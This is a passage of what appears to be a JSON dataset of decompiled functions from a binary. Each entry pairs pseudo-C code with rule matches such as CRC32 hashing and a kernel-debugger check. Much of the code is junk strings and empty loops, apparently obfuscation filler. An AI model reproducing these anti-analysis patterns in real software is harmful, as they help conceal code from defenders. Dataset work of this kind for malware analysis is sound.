}\n            else if ((arg_18h & 2) == 0) {\n                var_4h = 0x7fffffff;\n            }\n            else {\n                var_4h = 0x80000000;\n            }\n        }\n    }\n    if (var_94h != '\\0') {\n        *(var_a0h + 0x350) = *(var_a0h + 0x350) & 0xfffffffd;\n    }\n    goto code_r0x004c0adc;\n}\n",
        "token_count": 3193
    },
    "00403d78": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00403d78(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack304;\n    uchar auStack300 [24];\n    uchar auStack276 [24];\n    int32_t iStack252;\n    uchar auStack248 [24];\n    uchar auStack224 [24];\n    int32_t iStack200;\n    int32_t iStack196;\n    uchar auStack192 [24];\n    uchar auStack168 [48];\n    uint uStack120;\n    uchar uStack113;\n    uint uStack112;\n    uint uStack108;\n    uint uStack76;\n    uint uStack72;\n    uchar uStack65;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffeb0;\n    uStack28 = 0x450d20;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 2;\n    fcn.00401e79(\"zvewqibebposjofektsjncaqpatoesugmuacixyurl\");\n    uStack65 = 0;\n    uStack72 = 0x15ac;\n    uStack76 = 0x748;\n    uStack24 = 3;\n    fcn.00401e79(\"jvqvtwmsiqkbxmmjunzfevkuzphxgkjskoierdnmevgxvjpnzhnizsanprtfgnlnveyxnzoqcylder\");\n    uStack108 = 0x40d4edc0;\n    uStack112 = 0;\n    uStack113 = 1;\n    uStack120 = 0x268;\n    uStack24 = 4;\n    fcn.00401e79(\"dypaeameofbsnuxaulhulounrqbhewgccohpayoyaypmztavbkoldmpes\");\n    uStack24 = 5;\n    fcn.00401e79(\"dypaeameofbsnuxaulhulounrqbhewgccohpayoyaypmztavbkoldmpes\");\n    uStack24 = 8;\n    fcn.00401e79(\"dypaeameofbsnuxaulhulounrqbhewgccohpayoyaypmztavbkoldmpes\");\n    uVar1 = fcn.004042dc(auStack192, auStack168);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack196 = 0x3b; 0 < iStack196; iStack196 = iStack196 + -1) {\n        }\n    }\n    for (iStack200 = 0x62; 0 < iStack200; iStack200 = iStack200 + -1) {\n    }\n    uStack24 = 5;\n    fcn.00401e79(\"jvqvtwmsiqkbxmmjunzfevkuzphxgkjskoierdnmevgxvjpnzhnizsanprtfgnlnveyxnzoqcylder\");\n    uStack24 = 7;\n    fcn.00401e79(\"jvqvtwmsiqkbxmmjunzfevkuzphxgkjskoierdnmevgxvjpnzhnizsanprtfgnlnveyxnzoqcylder\");\n    uVar1 = fcn.00405b37(auStack248, auStack224);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack252 = 4; 0 < iStack252; iStack252 = iStack252 + -1) {\n        }\n    }\n    uStack24 = 5;\n    fcn.00401e79(\"dypaeameofbsnuxaulhulounrqbhewgccohpayoyaypmztavbkoldmpes\");\n    uStack24 = 6;\n    fcn.00401e79(\"dypaeameofbsnuxaulhulounrqbhewgccohpayoyaypmztavbkoldmpes\");\n    uVar1 = fcn.00405b37(auStack300, auStack276);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack304 = 0x3b; 0 < iStack304; iStack304 = iStack304 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x102bd;\n}\n",
        "token_count": 1138
    },
    "00403d91": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00403d91(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack156;\n    uchar auStack152 [24];\n    uchar auStack128 [24];\n    uint uStack104;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar uStack41;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff50;\n    uStack28 = 0x450ca0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack41 = 1;\n    uStack52 = 0x40e26920;\n    uStack56 = 0;\n    uStack60 = 0x40c53100;\n    uStack64 = 0;\n    uStack68 = 0x1b2c;\n    uStack72 = 0x6dd;\n    uStack76 = 0x592;\n    uStack24 = 0;\n    fcn.00401e79(\"bjvjqhijoeqrsonohwpwvbwoametglretxbrmgaakwxsgfvbvoqfo\");\n    uStack104 = 0x1dec;\n    uStack24 = 1;\n    fcn.00401e79(\"bjvjqhijoeqrsonohwpwvbwoametglretxbrmgaakwxsgfvbvoqfo\");\n    uStack24 = 2;\n    fcn.00401e79(\"bjvjqhijoeqrsonohwpwvbwoametglretxbrmgaakwxsgfvbvoqfo\");\n    uVar1 = fcn.004042dc(auStack152, auStack128);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack156 = 0x5b; 0 < iStack156; iStack156 = iStack156 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 564
    },
    "00403daf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403daf(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_54h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff74;\n    var_14h = 0x4503e0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 2;\n    fcn.00401e79(\"bsxnsdrmuackpijzzowdslpstrkazauhxxdnjxjy\");\n    var_3ch = 0x101d;\n    var_10h = 3;\n    fcn.00401e79(\"bsxnsdrmuackpijzzowdslpstrkazauhxxdnjxjy\");\n    var_10h = 4;\n    fcn.00401e79(\"bsxnsdrmuackpijzzowdslpstrkazauhxxdnjxjy\");\n    uVar1 = fcn.004042dc(&var_6ch, &var_54h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_70h = 0x2c; 0 < var_70h; var_70h = var_70h + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0x5d3;\n}\n",
        "token_count": 471
    },
    "00403eb8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403eb8(int16_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar (*pauVar5) [32];\n    uchar auVar6 [16];\n    uchar auVar7 [32];\n    uchar in_YMM1 [32];\n    int16_t *piVar2;\n    uint16_t uVar8;\n    \n    piVar2 = arg_8h;\n    if (*0x573c4c < 5) {\n        if (*0x573c4c < 1) {\n            if (arg_8h != arg_8h + arg_ch) {\n                do {\n                    if (*piVar2 == 0) break;\n                    piVar2 = piVar2 + 1;\n                } while (piVar2 != arg_8h + arg_ch);\n            }\n            iVar1 = piVar2 - arg_8h;\n            goto code_r0x004c05d1;\n        }\n        if ((arg_8h & 1) == 0) {\n            uVar4 = (-((arg_8h & 0xf) != 0) & 0x10 - (arg_8h & 0xf)) >> 1;\n            if (arg_ch < uVar4) {\n                uVar4 = arg_ch;\n            }\n            if (arg_8h != arg_8h + uVar4) {\n                do {\n                    if (*piVar2 == 0) break;\n                    piVar2 = piVar2 + 1;\n                } while (piVar2 != arg_8h + uVar4);\n            }\n            uVar3 = piVar2 - arg_8h >> 1;\n            if (uVar3 != uVar4) {\n                return uVar3;\n            }\n            for (piVar2 = arg_8h + uVar3; piVar2 != arg_8h + (arg_ch - uVar4 & 0xfffffff0) + uVar3; piVar2 = piVar2 + 8)\n            {\n                uVar8 = -(piVar2[7] == 0);\n                auVar6 = CONCAT214(uVar8, CONCAT212(-(piVar2[6] == 0), \n                                                    CONCAT210(-(piVar2[5] == 0), \n                                                              CONCAT28(-(piVar2[4] == 0), \n                                                                       CONCAT26(-(piVar2[3] == 0), \n                                                                                CONCAT24(-(piVar2[2] == 0), \n                                                                                         CONCAT22(-(piVar2[1] == 0), \n                                                                                                  -(*piVar2 == 0))))))))\n                ;\n                if ((SUB161(auVar6 >> 7, 0) & 1 | (SUB161(auVar6 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar6 >> 0x17, 0) & 1) << 2 | (SUB161(auVar6 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar6 >> 0x27, 0) & 1) << 4 | (SUB161(auVar6 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar6 >> 0x37, 0) & 1) << 6 | (SUB161(auVar6 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar6 >> 0x47, 0) & 1) << 8 | (SUB161(auVar6 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar6 >> 0x57, 0) & 1) << 10 | (SUB161(auVar6 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar6 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar6 >> 0x6f, 0) & 1) << 0xd |\n                     (uVar8 >> 7 & 1) << 0xe | uVar8 & 0x8000) != 0) break;\n            }\n            for (; (piVar2 != arg_8h + arg_ch && (*piVar2 != 0)); piVar2 = piVar2 + 1) {\n            }\n        }\n        else if (arg_8h != arg_8h + arg_ch) {\n            do {\n                if (*piVar2 == 0) break;\n                piVar2 = piVar2 + 1;\n            } while (piVar2 != arg_8h + arg_ch);\n        }\n    }\n    else {\n        if ((arg_8h & 1) == 0) {\n            uVar4 = (-((arg_8h & 0x1f) != 0) & 0x20 - (arg_8h & 0x1f)) >> 1;\n            if (arg_ch < uVar4) {\n                uVar4 = arg_ch;\n            }\n            if (arg_8h != arg_8h + uVar4) {\n                do {\n                    if (*piVar2 == 0) break;\n                    piVar2 = piVar2 + 1;\n                } while (piVar2 != arg_8h + uVar4);\n            }\n            uVar3 = piVar2 - arg_8h >> 1;\n            if (uVar3 != uVar4) {\n                return uVar3;\n            }\n            pauVar5 = arg_8h + uVar3;\n            auVar6 = vpxor_avx(SUB3216(in_YMM1, 0), SUB3216(in_YMM1, 0));\n            while ((pauVar5 != arg_8h + (arg_ch - uVar4 & 0xffffffe0) + uVar3 &&\n                   (auVar7 = vpcmpeqw_avx2(ZEXT1632(auVar6), *pauVar5), \n                   (SUB321(auVar7 >> 7, 0) & 1 | (SUB321(auVar7 >> 0xf, 0) & 1) << 1 |\n                    (SUB321(auVar7 >> 0x17, 0) & 1) << 2 | (SUB321(auVar7 >> 0x1f, 0) & 1) << 3 |\n                    (SUB321(auVar7 >> 0x27, 0) & 1) << 4 | (SUB321(auVar7 >> 0x2f, 0) & 1) << 5 |\n                    (SUB321(auVar7 >> 0x37, 0) & 1) << 6 | (SUB321(auVar7 >> 0x3f, 0) & 1) << 7 |\n                    (SUB321(auVar7 >> 0x47, 0) & 1) << 8 | (SUB321(auVar7 >> 0x4f, 0) & 1) << 9 |\n                    (SUB321(auVar7 >> 0x57, 0) & 1) << 10 | (SUB321(auVar7 >> 0x5f, 0) & 1) << 0xb |\n                    (SUB321(auVar7 >> 0x67, 0) & 1) << 0xc | (SUB321(auVar7 >> 0x6f, 0) & 1) << 0xd |\n                    (SUB321(auVar7 >> 0x77, 0) & 1) << 0xe | SUB321(auVar7 >> 0x7f, 0) << 0xf |\n                    (SUB321(auVar7 >> 0x87, 0) & 1) << 0x10 | (SUB321(auVar7 >> 0x8f, 0) & 1) << 0x11 |\n                    (SUB321(auVar7 >> 0x97, 0) & 1) << 0x12 | (SUB321(auVar7 >> 0x9f, 0) & 1) << 0x13 |\n                    (SUB321(auVar7 >> 0xa7, 0) & 1) << 0x14 | (SUB321(auVar7 >> 0xaf, 0) & 1) << 0x15 |\n                    (SUB321(auVar7 >> 0xb7, 0) & 1) << 0x16 | SUB321(auVar7 >> 0xbf, 0) << 0x17 |\n                    (SUB321(auVar7 >> 199, 0) & 1) << 0x18 | (SUB321(auVar7 >> 0xcf, 0) & 1) << 0x19 |\n                    (SUB321(auVar7 >> 0xd7, 0) & 1) << 0x1a | (SUB321(auVar7 >> 0xdf, 0) & 1) << 0x1b |\n                    (SUB321(auVar7 >> 0xe7, 0) & 1) << 0x1c | (SUB321(auVar7 >> 0xef, 0) & 1) << 0x1d |\n                    (SUB321(auVar7 >> 0xf7, 0) & 1) << 0x1e | SUB321(auVar7 >> 0xff, 0) << 0x1f) == 0))) {\n                pauVar5 = pauVar5[1];\n            }\n            for (; (pauVar5 != arg_8h + arg_ch && (**pauVar5 != 0)); pauVar5 = *pauVar5 + 2) {\n            }\n            vzeroupper_avx();\n            return pauVar5 - arg_8h >> 1;\n        }\n        if (arg_8h != arg_8h + arg_ch) {\n            do {\n                if (*piVar2 == 0) break;\n                piVar2 = piVar2 + 1;\n            } while (piVar2 != arg_8h + arg_ch);\n        }\n    }\n    iVar1 = piVar2 - arg_8h;\ncode_r0x004c05d1:\n    return iVar1 >> 1;\n}\n",
        "token_count": 2363
    },
    "00403ed1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nfloat10 fcn.00403ed1(void)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_95h;\n    uint var_90h;\n    uint var_78h;\n    int32_t var_60h;\n    uchar var_5ah;\n    uchar var_59h;\n    uint var_58h;\n    uint var_54h;\n    uint var_3ch;\n    uchar var_21h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff5c;\n    var_10h = 0xffffffff;\n    var_14h = 0x450600;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_21h = 0;\n    fcn.00401e79(\"hjehrtwfrnifkvqftunznzoschynrexfew\");\n    var_10h = 0;\n    fcn.00401e79(\"blcgweafmaalwttipdhoswzqelikxknapobrvjdalmwidupfyymbnvqpiyuyubmhpayjirdufdxrxcgxaubivwxpxfr\");\n    var_58h = 0x373;\n    var_59h = 1;\n    var_5ah = 0;\n    for (var_60h = 0x57; 0 < var_60h; var_60h = var_60h + -1) {\n    }\n    var_10h = 1;\n    fcn.00401e79(\"blcgweafmaalwttipdhoswzqelikxknapobrvjdalmwidupfyymbnvqpiyuyubmhpayjirdufdxrxcgxaubivwxpxfr\");\n    var_10h = 2;\n    fcn.00401e79(\"blcgweafmaalwttipdhoswzqelikxknapobrvjdalmwidupfyymbnvqpiyuyubmhpayjirdufdxrxcgxaubivwxpxfr\");\n    uVar1 = fcn.004042dc(&var_90h, &var_78h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (stack0xffffff68 = 0x48; 0 < stack0xffffff68; *NULL = stack0xffffff68 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return *0x546dd4;\n}\n",
        "token_count": 635
    },
    "00404089": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404089(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_d9h;\n    uint var_d4h;\n    uint var_bch;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_88h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_54h;\n    uint var_3ch;\n    uint var_24h;\n    uint8_t var_1dh;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff18;\n    var_10h = 0xffffffff;\n    var_14h = 0x451380;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_1dh = arg_ch & 1;\n    fcn.00401e79(\"tjlrsrvrexpaxnrrsjjxigsttowvhezixo\");\n    var_10h = 0;\n    fcn.00401e79(\"tjlrsrvrexpaxnrrsjjxigsttowvhezixo\");\n    var_10h = 3;\n    fcn.00401e79(\"tjlrsrvrexpaxnrrsjjxigsttowvhezixo\");\n    uVar1 = fcn.00405b37(&var_6ch, &var_54h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_70h = 4; 0 < var_70h; var_70h = var_70h + -1) {\n        }\n    }\n    var_10h = 0;\n    fcn.00401e79(\"tjlrsrvrexpaxnrrsjjxigsttowvhezixo\");\n    var_10h = 2;\n    fcn.00401e79(\"tjlrsrvrexpaxnrrsjjxigsttowvhezixo\");\n    uVar1 = fcn.00405b37(&var_a0h, &var_88h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_a4h = 0x3e; 0 < var_a4h; var_a4h = var_a4h + -1) {\n        }\n    }\n    var_10h = 0;\n    fcn.00401e79(\"tjlrsrvrexpaxnrrsjjxigsttowvhezixo\");\n    var_10h = 1;\n    fcn.00401e79(\"tjlrsrvrexpaxnrrsjjxigsttowvhezixo\");\n    uVar1 = fcn.00405b37(&var_d4h, &var_bch);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (stack0xffffff24 = 0x3a; 0 < stack0xffffff24; *NULL = stack0xffffff24 + -1) {\n        }\n    }\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 1;\n}\n",
        "token_count": 805
    },
    "0040408e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040408e(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_30h;\n    uint var_29h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x426f20;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.004035e4(arg_8h);\n    var_10h = 0;\n    uVar1 = fcn.00401fdc();\n    if ((uVar1 & 1) == 0) {\n        *(in_ECX + 4) = 0;\n    }\n    else {\n        iVar2 = fcn.00404700();\n        if ((iVar2 == 0) || (iVar2 == arg_8h)) {\n            *(in_ECX + 4) = 1;\n        }\n        else {\n            fcn.0040307b();\n            uVar1 = fcn.00401fdc();\n            *(in_ECX + 4) = uVar1 & 1;\n        }\n    }\n    *in_FS_OFFSET = var_18h;\n    return in_ECX;\n}\n",
        "token_count": 335
    },
    "004040ca": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.004040ca(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403b02(&stack0x00000034);\n    fcn.00403b02();\n    return 1;\n}\n",
        "token_count": 79
    },
    "004040ed": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004040ed(uint16_t *arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t **arg_14h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(*in_ECX + 0xc) >> 0xc & 1) != 0) && (*(*in_ECX + 4) == 0)) {\n        *arg_10h = *arg_10h + arg_ch;\n        return;\n    }\n    piVar4 = *arg_14h;\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00403a35();\n        *arg_14h = piVar4;\n    }\n    iVar2 = *piVar4;\n    *piVar4 = 0;\n    puVar1 = arg_8h + arg_ch;\n    if (arg_8h != puVar1) {\n        do {\n            cVar3 = fcn.0040170d(*arg_8h);\n            if (cVar3 == '\\0') {\n                piVar5 = *arg_14h;\n                if (piVar5 == NULL) {\n                    piVar5 = fcn.00403a35();\n                    *arg_14h = piVar5;\n                }\n                if (*piVar5 != 0x2a) {\n                    *arg_10h = -1;\n                    break;\n                }\n                cVar3 = fcn.0040170d(0x3f);\n                if (cVar3 != '\\0') goto code_r0x004a9c5e;\n                *arg_10h = -1;\n            }\n            else {\ncode_r0x004a9c5e:\n                *arg_10h = *arg_10h + 1;\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != puVar1);\n    }\n    if ((*piVar4 == 0) && (iVar2 != 0)) {\n        *piVar4 = iVar2;\n    }\n    return;\n}\n",
        "token_count": 520
    },
    "0040410b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040410b(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x450440;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    fcn.00401e79(\"golapguitpzmssljntognvbxvszvovsdmfvucnsryiyirhwqonkjtlrenlxfopepnsbqyxcvnjiegvgmoflyouwd\");\n    for (var_40h = 0x3c; 0 < var_40h; var_40h = var_40h + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 1;\n}\n",
        "token_count": 270
    },
    "00404124": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x004c13fd)\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl fcn.00404124(uint arg_8h, uint8_t *arg_ch, uint8_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint *puVar4;\n    uint8_t *puVar5;\n    uint8_t uVar6;\n    uint32_t extraout_ECX;\n    uint32_t unaff_EBX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint8_t *var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    cVar3 = fcn.00403d96();\n    if (cVar3 != '\\0') {\n        if ((arg_14h == 0) || ((1 < arg_14h && (arg_14h < 0x25)))) {\n            fcn.004058a8(arg_8h);\n            iVar7 = 0;\n            var_10h = 0;\n            var_2ch = arg_ch;\n            do {\n                puVar5 = arg_ch;\n                uVar6 = *puVar5;\n                uVar8 = unaff_EBX & 0xffffff00;\n                unaff_EBX = uVar8 | uVar6;\n                arg_ch = puVar5 + 1;\n                var_ch = var_ch & 0xffffff00 | uVar6;\n                var_1h._0_1_ = uVar6;\n                iVar10 = fcn.00403d4b(uVar6, 8, &var_38h);\n            } while (iVar10 != 0);\n            var_8h = arg_18h & 0xff;\n            if (uVar6 == 0x2d) {\n                var_8h = var_8h | 2;\ncode_r0x004c12d5:\n                var_1h._0_1_ = *arg_ch;\n                unaff_EBX = uVar8 | var_1h;\n                arg_ch = puVar5 + 2;\n                var_ch = var_ch & 0xffffff00 | var_1h;\n            }\n            else if (uVar6 == 0x2b) goto code_r0x004c12d5;\n            if ((arg_14h == 0) || (arg_14h == 0x10)) {\n                cVar3 = unaff_EBX;\n                if (cVar3 - 0x30U < 10) {\n                    iVar10 = cVar3 + -0x30;\n                }\n                else if (cVar3 + 0x9fU < 0x1a) {\n                    iVar10 = cVar3 + -0x57;\n                }\n                else if (cVar3 + 0xbfU < 0x1a) {\n                    iVar10 = cVar3 + -0x37;\n                }\n                else {\n                    iVar10 = -1;\n                }\n                if (iVar10 == 0) {\n                    uVar6 = *arg_ch;\n                    var_18h = var_18h & 0xffffff00 | uVar6;\n                    if ((uVar6 == 0x78) || (uVar6 == 0x58)) {\n                        if (arg_14h == 0) {\n                            arg_14h = 0x10;\n                        }\n                        var_1h._0_1_ = arg_ch[1];\n                        var_ch = var_ch & 0xffffff00 | var_1h;\n                        arg_ch = arg_ch + 2;\n                    }\n                    else {\n                        if (arg_14h == 0) {\n                            arg_14h = 8;\n                        }\n                        fcn.00402e0a(var_18h);\n                        arg_ch = arg_ch + 1;\n                    }\n                }\n                else if (arg_14h == 0) {\n                    arg_14h = 10;\n                }\n            }\n            var_24h = arg_14h >> 0x1f;\n            var_28h = arg_14h;\n            uVar11 = fcn.00401820(0xffffffff, 0xffffffff, arg_14h, var_24h, unaff_EBX);\n            uVar1 = var_10h;\n            uVar8 = var_8h;\n            var_20h = extraout_ECX;\n            var_1ch = unaff_EBX;\n            uVar6 = var_1h;\n            while( true ) {\n                iVar10 = uVar1 >> 0x20;\n                var_10h = uVar1;\n                if (uVar6 - 0x30 < 10) {\n                    var_8h = uVar6 - 0x30;\n                }\n                else if (uVar6 + 0x9f < 0x1a) {\n                    var_8h = uVar6 - 0x57;\n                }\n                else if (uVar6 + 0xbf < 0x1a) {\n                    var_8h = uVar6 - 0x37;\n                }\n                else {\n                    var_8h = 0xffffffff;\n                }\n                if ((var_8h == 0xffffffff) || (arg_14h <= var_8h)) break;\n                uVar9 = uVar8 | 8;\n                if ((uVar1 < uVar11) || ((uVar1 == uVar11 && ((var_1ch != 0 || (var_8h <= var_20h)))))) {\n                    iVar12 = fcn.00402685(var_28h, var_24h, uVar1);\n                    var_18h = uVar11 >> 0x20;\n                    var_14h = uVar11;\n                    uVar1 = iVar12 - 0xc;\n                }\n                else {\n                    uVar9 = uVar8 | 0xc;\n                }\n                uVar6 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                var_ch = var_ch & 0xffffff00 | uVar6;\n                uVar8 = uVar9;\n            }\n            var_8h = uVar8;\n            fcn.00402e0a(var_ch);\n            iVar2 = var_10h;\n            var_18h = uVar11 >> 0x20;\n            var_14h = uVar11;\n            if ((uVar8 & 8) == 0) {\n                iVar10 = 0;\n                arg_ch = var_2ch;\n            }\n            else {\n                cVar3 = fcn.00403b93(var_8h, var_10h, iVar10);\n                var_18h = uVar11 >> 0x20;\n                var_14h = uVar11;\n                if (cVar3 == '\\0') {\n                    iVar7 = iVar2;\n                    if ((var_8h & 2) != 0) {\n                        iVar7 = -iVar2;\n                        iVar10 = -(iVar10 + (iVar2 != 0));\n                    }\n                }\n                else {\n                    puVar4 = fcn.00403a35();\n                    var_18h = uVar11 >> 0x20;\n                    var_14h = uVar11;\n                    *puVar4 = 0x22;\n                    if ((var_8h & 1) == 0) {\n                        iVar10 = -1;\n                        iVar7 = -1;\n                    }\n                    else if ((var_8h & 2) == 0) {\n                        iVar7 = -1;\n                        iVar10 = 0x7fffffff;\n                    }\n                    else {\n                        iVar10 = -0x80000000;\n                    }\n                }\n            }\n            if (var_30h != '\\0') {\n                *(var_3ch + 0x350) = *(var_3ch + 0x350) & 0xfffffffd;\n            }\n            goto code_r0x004c1268;\n        }\n        puVar4 = 